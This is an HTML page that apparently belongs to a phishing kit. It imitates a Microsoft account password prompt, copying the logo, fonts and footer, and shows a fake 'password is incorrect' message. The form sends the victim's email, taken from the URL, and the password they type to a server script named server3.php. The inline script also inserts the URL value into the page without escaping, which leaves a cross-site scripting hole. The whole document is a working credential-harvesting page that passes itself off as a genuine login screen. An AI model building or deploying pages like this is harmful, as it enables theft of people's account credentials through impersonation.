<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" >
	<title>Sign in to your account</title>
	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">

	<link rel="shortcut icon" type="icon" href="images/favicon.png">
	<link rel="stylesheet" type="text/css" href="style.css">
	<script type="text/javascript" src="js/jquery.js"></script>

	<style type="text/css">
		
		* {
	box-sizing: border-box;
}

body {
	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
	margin: 0;
	padding: 0;
	width: 100%;
	background-image: url('images/0.jpg');
	background-repeat: no-repeat;
	background-attachment: fixed;
	background-position: center;
	background-size: cover;
	background-origin: border-box;
}

.overlay {
	position: absolute;
	width: 100%;
	height: 100%;
	background-color: rgba(0,0,0,0.55);
}

a { 
	text-decoration: none; 
	color: #0067b8;
}

a:hover { color: #005da6; }

footer {
	display: block;
	position: fixed;
	width: 100%;
	height: 30px;
	bottom: 0;
	left: 0;
	padding: 0;
	background-color: rgba(0,0,0,0.7);
	color: #fff;
}

footer ul {
	padding: 0;
	margin: 0;
}

footer ul li {
	list-style-type: none;
	display: inline-table;
	float: right;
	margin: 1px 10px;
}

footer ul li a {
	color: #fff; 
	font-size: 12px;
}

footer ul li a:hover {
	color: #fff; 
}

.btn-group {
	display: inline-flex;
}		

.login-box {
	background-color: #fff;
	z-index: 1000;
	margin: auto;
	margin-top: 10.1%;
	min-height: 310px;
	min-width: 320px;
	max-width: 422px;
	width: 422px;
	padding: 30px 30px 40px;
	border: groove 1px rgba(0,0,0,0.1);
}

.login-box h2 {
	font-weight: normal;
	margin-bottom: 0.5em;
}

.login-box input[type='email'], .login-box input[type='password'] {
	width: 100%;
	height: 2.5em;
	font-size: 15px;
	box-shadow: none;
	overflow: hidden;
    border: none;
    border-bottom: 1px solid #666;
	margin-bottom: 1em;
}

.login-box input[type='email']:focus,
.login-box input[type='email']:active,
.login-box input[type='password']:focus, 
.login-box input[type='password']:active {
	outline: none;
	border-color: #0067b8;
}

.login-box input[type='submit'], .login-box input[type='reset'], .next {
	display: block;
	width: 110px;
	background-color: #0067b8;
	height: 34px;
	color: #fff;
	border-style: solid;
	border-color: #0067b8;
	font-size: 16px;
}

.login-box input[type='reset'].rev-btn {
	background-color: #ccc;
	color: #000;
	border-color: #ccc;
}

.login-box input[type='submit']:hover, .login-box input[type='reset']:hover, .next:hover {
	background-color: #005da6;
	border-color: #005da6;
	border-style: solid;
}

.login-box input[type='reset'].rev-btn:hover {
	background-color: #ccc;
	color: #000;
	border-color: #ccc;
}

.login-box input[type='submit']:focus, .login-box input[type='reset']:focus, .next:focus {
	border-width: 2px;
	border-color: #000;
	text-decoration: underline;
	outline: none;
}

.login-box input[type='reset'].rev-btn:focus {
	border-width: 2px;
	border-color: #000;
	text-decoration: underline;
	outline: none;
}

.login-box input[type='checkbox'] {
	width: 20px;
	height: 20px;
	float: left;
}

.login-box input[type='checkbox']:focus {
	outline: none;
}

.identity-banner {
    height: 28px;
    background: #ffffff;
    margin: 16px -30px;
    padding: 0 36px;
}

.identity {
    line-height: 28px;
    white-space: nowrap;
    overflow: hidden;
    text-overflow: ellipsis;
    text-align: left;
    width: calc(100% - 56px);
}

.profile-photo {
    height: 48px;
    width: 48px;
    margin-top: -48px;
    border-radius: 50%;
    overflow: hidden;
    float: right;
}

.hidden {
	display: none;
	visibility: hidden;
}

.fade:hover {
	color: #666;
}
.fade2 {
	color: #666;
}

.message {
	font-size: 15px;
	color: red;
}
.message2 {
	font-size: 20px;
	color: green;
}
.message3 {
	color: #0067b8;
}
.error {
	outline: none;
	border-color: red !important;
}


.loader {
    position: absolute;
	padding-top: 0;
	width: 40px;
	margin: -22px;
}

.loader .circle {
	position: absolute;
	width: 18px;
	height: 18px;
	opacity: 0;
	transform: rotate(225deg);
	animation-iteration-count: infinite;
	animation-name: orbit;
	animation-duration: 3s;
}

.loader .circle:after {
	content: "";
	position: absolute;
	width: 3px;
	height: 3px;
	border-radius: 5px;
	background: #000;
}

.loader .circle:nth-child(2) {
	animation-delay: 240ms;
}
.loader .circle:nth-child(3) {
	animation-delay: 480ms;
}
.loader .circle:nth-child(4) {
	animation-delay: 720ms;
}
.loader .circle:nth-child(5) {
	animation-delay: 960ms;
}

@keyframes orbit {
	0% {
		transform: translate(10px, 0);
		opacity: 1;
		animation-timing-function: ease-out;
	}
	7% {
		transform: translate(30px, 0);
		animation-timing-function: linear;
	}
	30% {
		transform: translate(60px, 0);
		animation-timing-function: ease-in-out;
	}
	40% {
		transform: translate(90px, 0);
		animation-timing-function: ease-out;
	}
	50% {
		transform: translate(120px, 0);
		animation-timing-function: ease-out;
	}
	75% {
		transform: translate(250px, 0);
		animation-timing-function: ease-out;
	}
	76% {
		transform: translate(300px, 0);
		opacity: 0;
	}
	100% {
		transform: translate(350px, 0);
		opacity: 0;
	}
}


@media(max-width: 600px) {
	body {
		background-color: #fff;
		background-image: none;
	}

	.overlay {
		background-color: rgba(0,0,0,0);
	}

	.login-box {
		border: none;
	}

	footer {
		background-color: rgba(0,0,0,0);
	}

	footer ul li {
		margin: 1px 5px;
	}

	footer ul li a {
		color: #666;
	}

	footer ul li a:hover {
		color: #666; 
	}
}

@media(max-width: 425px) {
	.login-box {
		width: 390px
	}
}


@media(max-width: 375px) {
	.login-box {
		width: 360px
	}

	footer ul {
		margin-right: 10%;
	}
}


@media(max-width: 320px) {
	.login-box {
		width: 300px
	}
}

	</style>
</head>

<body>
	<div class="overlay">
		<div class="login-box">
			<img src="images/ms-logo-v2.jpg" alt="logo">
			<div id="identity" class="identity-banner">
				<a href="#" style="color: #000;">&#8592;</a> <a id="identity-name" style="color: #000;"></a>
			</div>
			<h2 id="title">Enter password</h2>
			<p id="message" class="message">
				Your password is incorrect, please try again. If you don't remember your password, <a href="#" class="fade">reset it now.</a>
			</p>
			<div id="loader" class="loader hidden">
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
				<div class="circle"></div>
			</div>

						<form action="server3.php" method="post">
			<noscript><input type="email" id="params1xx" name="email1" placeholder="Email Address" required autofocus></noscript>
				<input type="hidden" id="params1xx" name="email1" value="">
				<input id="password" type="password" name="password1" placeholder="Password" required autofocus>
			<script>

				/**
 * Get the value of a querystring
 * @param  {String} field The field to get the value of
 * @param  {String} url   The URL to get the value from (optional)
 * @return {String}       The field value
 */
var getQueryString = function ( field, url ) {
	var href = url ? url : window.location.href;
	var reg = new RegExp( '[?&]' + field + '=([^&#]*)', 'i' );
	var string = reg.exec(href);
	return string ? string[1] : null;
};

					//To print email to screen 
					//document.getElementById("identity-name").innerHTML = params1x[1];
					document.getElementById("identity-name").innerHTML = getQueryString('email');
					
					//To print email value into textfield
					document.getElementById('params1xx').value = getQueryString('email');
					
					//To print an alert to screen
					//alert(params1x[1]);

					// Function to split URL


			</script>

			<div id="group2">
				<small id="fps"><a href="#" class="fade">Forgot my password</a></small>
				<br>
				<br>
			</div>
			<div align="right">
			<input align="right" id="signin" type="submit" name="signin" value="Sign in">
			</div>
			</form>
		</div>
	</div>

	<footer>
		<ul>
			<li><a href="#">Privacy & cookies</a></li>
			<li><a href="#">Terms of use</a></li>
			<li><a>&copy;2020 Microsoft</a></li>
		</ul>
	</footer>

</body>
</html>